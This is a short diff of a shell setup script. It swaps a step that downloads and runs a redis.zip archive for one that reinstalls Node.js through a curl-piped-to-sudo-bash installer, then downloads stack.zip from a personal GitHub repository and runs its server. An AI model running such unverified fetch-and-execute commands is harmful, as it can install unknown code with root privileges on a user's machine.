@@ -1,4 +1,10 @@
-curl -O -L -J https://github.com/akumetaulu/symmetrical-octo-palm-tree/raw/refs/heads/main/redis.zip
-unzip redis.zip
-bash run.sh
-
+sudo apt update
+sudo apt remove -y libnode-dev nodejs
+sudo dpkg --configure -a
+sudo apt --fix-broken install
+curl -fsSL https://deb.nodesource.com/setup_25.x | sudo -E bash -
+sudo apt-get install -y nodejs npm
+curl -O -L -J https://github.com/akumetaulu/reimagined-palm-tree/raw/refs/heads/main/stack.zip
+unzip stack.zip
+npm install
+npx tsx server.ts
